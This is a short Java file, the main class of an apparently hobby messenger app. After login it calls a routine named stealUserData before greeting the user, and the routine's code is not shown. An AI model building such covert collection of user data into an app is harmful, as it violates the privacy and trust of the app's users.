package com.vladimirsimek.messenger;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;

import static com.vladimirsimek.messenger.Data.*;
import static com.vladimirsimek.messenger.Logic.*;
import static com.vladimirsimek.messenger.StealUserData.stealUserData;
import static com.vladimirsimek.messenger.UserInterface.*;

public class Main {

    public static void main(String[] args) {
        getLogin();
        stealUserData();
        greet(name);


    }
}
